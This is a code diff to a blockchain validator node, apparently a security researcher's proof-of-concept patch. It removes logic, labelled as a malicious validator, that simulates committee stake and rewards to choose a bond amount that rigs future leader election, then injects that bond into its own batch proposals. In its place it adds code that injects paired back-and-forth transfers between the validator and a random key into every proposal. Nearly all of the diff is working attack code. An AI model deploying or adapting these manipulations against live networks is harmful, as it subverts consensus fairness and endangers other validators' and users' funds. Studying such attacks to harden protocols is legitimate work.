@@ -100,7 +100,7 @@ pub struct Primary<N: Network> {
     propose_lock: Arc<TMutex<u64>>,
     dev: Option<u16>,
     // bond_amount -> transaction
-    cache_transactions: Arc<Mutex<IndexMap<u64, Transaction<N>>>>,
+    cache_transactions: Arc<Mutex<Vec<(Transaction<N>, Transaction<N>)>>>,
 }
 
 impl<N: Network> Primary<N> {
@@ -450,161 +450,21 @@ impl<N: Network> Primary<N> {
         *lock_guard = round;
 
         {
-            // The malicious validator try to insert a bond transaction to manipulate the leader election
-            let start = std::time::Instant::now();
-            let current_round = self.current_round();
-            info!("Current round: {} cached transactions {}", current_round, self.cache_transactions.lock().len());
-            if Some(0) == self.dev && current_round % 2 == 0 && self.cache_transactions.lock().len() >= 80 {
-                // 1. Get all transmissions this BatchPropose will commit (if I am the leader)
-                let mut all_transmissions = transmissions.clone();
-                // Let last_commit_round = self.ledger.latest_round();
-                let mut processed_cert = IndexSet::new();
-                let mut all_certs = previous_certificates.clone().into_iter().collect::<Vec<_>>();
-                while let Some(cert) = all_certs.pop() {
-                    // add previous cert
-                    for prev_cert_id in cert.previous_certificate_ids() {
-                        if processed_cert.contains(prev_cert_id) {
-                            continue;
-                        }
-                        processed_cert.insert(*prev_cert_id);
+            if Some(0) == self.dev && self.cache_transactions.lock().len() >= 1 {
+                info!("inserting transactions");
+                let (t1, t2) = self.cache_transactions.lock().pop().unwrap();
 
-                        if let Some(prev_cert) = self.storage.get_certificate(*prev_cert_id) {
-                            all_certs.push(prev_cert);
-                        }
-                    }
-                    for transmission_id in cert.transmission_ids() {
-                        if let Some(transmission) = self.storage.get_transmission(*transmission_id) {
-                            match transmission {
-                                Transmission::Transaction(_) => {
-                                    all_transmissions.insert(*transmission_id, transmission);
-                                }
-                                _ => continue,
-                            }
-                        }
-                    }
-                }
-                all_transmissions.retain(|transmission_id, transmission| {
-                    if let Transmission::Transaction(_) = transmission {
-                        if !self.ledger.contains_transmission(transmission_id).unwrap() {
-                            return true;
-                        }
-                    }
-                    false
-                });
-                info!("Time cost: get all transmissions took {:?}", std::time::Instant::now() - start);
-
-                // 2. Calculate all the bond
-                let mut bond_count = IndexMap::new();
-                let mut bond_map: IndexMap<Address<N>, u64> = IndexMap::new();
-                all_transmissions.clone().into_iter().for_each(|(_, transmission)| {
-                    if let Transmission::Transaction(transaction) = transmission {
-                        let transaction = transaction.deserialize_blocking().unwrap();
-                        if let Transaction::Execute(_, execution, _) = transaction {
-                            let transition = execution.peek().unwrap();
-                            if transition.program_id().to_string() == "credits.aleo"
-                                && transition.function_name().to_string() == "bond_public"
-                            {
-                                let inputs = transition.inputs();
-                                let address_input = &inputs[0];
-                                let amount_input = &inputs[1];
-                                let address = match address_input {
-                                    Input::Public(_, Some(Plaintext::Literal(Literal::Address(address), _))) => {
-                                        *address
-                                    }
-                                    _ => panic!("Invalid address input"),
-                                };
-                                let amount = match amount_input {
-                                    Input::Public(_, Some(Plaintext::Literal(Literal::U64(microcredits), _))) => {
-                                        *microcredits
-                                    }
-                                    _ => panic!("Invalid address input"),
-                                };
-                                let bond = bond_map.entry(address).or_insert(0);
-                                *bond += *amount;
-
-                                let count = bond_count.entry(*address).or_insert(0);
-                                *count += 1;
-                            }
-                        }
-                    }
-                });
-                info!("Time cost: get bond map took {:?}", std::time::Instant::now() - start);
-                info!("bond_map {:?} {:?}", bond_map, bond_count);
-                info!(
-                    "bond_count {}/{}",
-                    bond_count.into_iter().map(|(_, count)| count).sum::<usize>(),
-                    all_transmissions.len()
-                );
-
-                // 3. Find target transaction that make me leader in future round
-                use snarkvm::prelude::{
-                    block_reward,
-                    coinbase_reward,
-                    ensure_stakers_matches,
-                    staking_rewards,
-                    to_next_committee,
-                };
-                let mut i = 0;
-                let current_block = self.ledger.latest_block();
-                // let cumulative_proof_target = current_block.cumulative_proof_target();
-                let self_address = self.gateway.account().address();
-                let current_committee = self.ledger.current_committee().unwrap();
-                // info!("current_block cumulative_proof_target {cumulative_proof_target}");
-                let coinbase_reward = coinbase_reward(
-                    current_block.height().saturating_add(1),
-                    N::STARTING_SUPPLY,
-                    N::ANCHOR_HEIGHT,
-                    N::BLOCK_TIME,
-                    0,
-                    0,
-                    current_block.coinbase_target(),
-                )
-                .unwrap();
-                let reward = block_reward(N::STARTING_SUPPLY, N::BLOCK_TIME, coinbase_reward, 0);
-                info!("coinbase_reward {coinbase_reward}, reward {reward}");
-                let mut target_amount = 0;
-                for bond_amount in self.cache_transactions.lock().keys() {
-                    i += 1;
-                    let mut next_stakers: IndexMap<Address<N>, (Address<N>, u64)> = IndexMap::new();
-                    let mut next_members = IndexMap::new();
-                    current_committee.members().into_iter().for_each(|(address, (amount, _))| {
-                        let mut next_amount = *amount + bond_map.get(address).unwrap_or(&0);
-                        if address == &self_address {
-                            next_amount += bond_amount;
-                        }
-                        next_stakers.insert(*address, (*address, next_amount));
-                        next_members.insert(*address, (next_amount, true));
-                    });
-
-                    let next_committee = Committee::new(current_round, next_members).unwrap();
-                    ensure_stakers_matches(&next_committee, &next_stakers).unwrap();
-                    let next_rewarded_stakers = staking_rewards(&next_stakers, &next_committee, reward);
-                    let next_rewarded_committee =
-                        to_next_committee(&next_committee, current_round, &next_rewarded_stakers).unwrap();
-
-                    // In practice, we can make us leader in many consecutive even rounds
-                    if next_rewarded_committee.get_leader(current_round + 2).unwrap() == self_address
-                        && next_rewarded_committee.get_leader(current_round + 4).unwrap() == self_address
-                    // && next_rewarded_committee.get_leader(current_round + 6).unwrap() == self_address
-                    {
-                        // Found the parameters.
-                        info!("Find parameters with {i} iterations bond_amount {bond_amount}");
-                        info!(
-                            "If I am the leader of current_round {current_round} and this round is committed as a block, then I will be the leader at round {}",
-                            current_round + 2
-                        );
-                        target_amount = *bond_amount;
-                        break;
-                    }
-                }
-                assert!(target_amount > 0);
-                let transaction = self.cache_transactions.lock().remove(&target_amount).unwrap().clone();
-                let transaction_id = transaction.id();
+                let transaction_id = t1.id();
                 let transmission_id = TransmissionID::Transaction(transaction_id);
-                let transmission = Transmission::Transaction(Data::Object(transaction));
+                let transmission = Transmission::Transaction(Data::Object(t1));
                 // Insert the target transaction into my BatchPropose
                 transmissions.insert(transmission_id, transmission);
-                info!("Time cost: all took {:?}", std::time::Instant::now() - start);
+
+                let transaction_id = t2.id();
+                let transmission_id = TransmissionID::Transaction(transaction_id);
+                let transmission = Transmission::Transaction(Data::Object(t2));
+                // Insert the target transaction into my BatchPropose
+                transmissions.insert(transmission_id, transmission);
             }
         }
 
@@ -1270,26 +1130,28 @@ impl<N: Network> Primary<N> {
 
         // Generate and cache bond transactions in advance because they are expensive.
         if Some(0) == self.dev {
-            for _ in 0..5 {
-                let self_ = self.clone();
-                self.spawn(async move {
-                    loop {
-                        // Sleep briefly, but longer than if there were no batch.
-                        tokio::time::sleep(Duration::from_millis(10)).await;
+            let self_ = self.clone();
+            self.spawn(async move {
+                tokio::time::sleep(Duration::from_millis(10000)).await;
+                loop {
+                    // Sleep briefly, but longer than if there were no batch.
+                    tokio::time::sleep(Duration::from_millis(10)).await;
 
-                        if self_.cache_transactions.lock().len() > 120 {
-                            continue;
-                        }
-
-                        let amount = rand::thread_rng().gen_range(1_000_000u64..10_000_000u64);
-                        let transaction = self_
-                            .ledger
-                            .generate_bond_transaction(amount, *self_.gateway.account().private_key())
-                            .unwrap();
-                        self_.cache_transactions.lock().insert(amount, transaction);
+                    if self_.cache_transactions.lock().len() > 120 {
+                        continue;
                     }
-                });
-            }
+                    use snarkvm::prelude::PrivateKey;
+                    let mut rng = rand::thread_rng();
+                    let sample_private_key = PrivateKey::new(&mut rng).unwrap();
+                    let sample_address = Address::try_from(sample_private_key).unwrap();
+                    let validator_private_key = *self_.gateway.account().private_key();
+                    let validator_address = Address::try_from(validator_private_key).unwrap();
+                    let amount = 1_000_000u64;
+                    let t1 = self_.ledger.generate_transaction(validator_private_key, amount, sample_address).unwrap();
+                    let t2 = self_.ledger.generate_transaction(sample_private_key, amount, validator_address).unwrap();
+                    self_.cache_transactions.lock().push((t1, t2));
+                }
+            });
         }
     }
 
